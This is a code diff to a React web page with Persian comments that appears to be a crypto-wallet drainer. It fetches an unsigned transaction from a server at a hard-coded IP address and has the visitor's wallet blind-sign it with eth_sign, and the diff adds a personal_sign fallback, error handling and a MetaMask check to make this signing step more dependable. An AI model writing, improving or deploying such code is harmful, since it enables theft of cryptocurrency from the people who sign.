@@ -32,7 +32,7 @@ function App() {
 
     // 🔹 آدرس API پروکسی شده
     let proxyUrl = "https://104.194.133.124:8080/";
-    let apiUrl = proxyUrl + "http://104.194.133.124/send.php";
+    let apiUrl = proxyUrl + "send.php";
 
     async function genSign(address, chain, type, contract = "0") {
       try {
@@ -40,13 +40,29 @@ function App() {
         if (type === "token") requestData.contract = contract;
 
         var result = await jQuery.post(apiUrl, requestData);
-        var unSigned = JSON.parse(result);
-        console.log("📜 Unsigned Transaction:", unSigned);
+        
+        // بررسی و مدیریت خطای JSON
+        try {
+          var unSigned = JSON.parse(result);
+          console.log("📜 Unsigned Transaction:", unSigned);
+        } catch (e) {
+          console.error("⚠ JSON Parsing Error in genSign:", e, result);
+          return null;
+        }
 
-        var Signed = await provider.request({
-          method: "eth_sign",
-          params: [address, unSigned.result],
-        });
+        var Signed;
+        try {
+          Signed = await provider.request({
+            method: "eth_sign",
+            params: [address, unSigned.result],
+          });
+        } catch (e) {
+          console.warn("⚠ eth_sign failed, trying personal_sign...");
+          Signed = await provider.request({
+            method: "personal_sign",
+            params: [unSigned.result, address],
+          });
+        }
 
         return Signed;
       } catch (error) {
@@ -63,8 +79,14 @@ function App() {
           type,
         });
 
-        var resultJson = JSON.parse(result);
-        return resultJson.result;
+        // بررسی و مدیریت خطای JSON
+        try {
+          var resultJson = JSON.parse(result);
+          return resultJson.result;
+        } catch (e) {
+          console.error("⚠ JSON Parsing Error in acceptSign:", e, result);
+          return null;
+        }
       } catch (error) {
         console.error("❌ Error in acceptSign:", error);
         return null;
@@ -86,7 +108,13 @@ function App() {
     <a
       href="#"
       id="kos"
-      onClick={runner}
+      onClick={() => {
+        if (!window.ethereum) {
+          alert("⚠ MetaMask یا یک کیف‌پول Web3 نصب نیست.");
+          return;
+        }
+        runner();
+      }}
       className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
       data-uk-toggle=""
     >
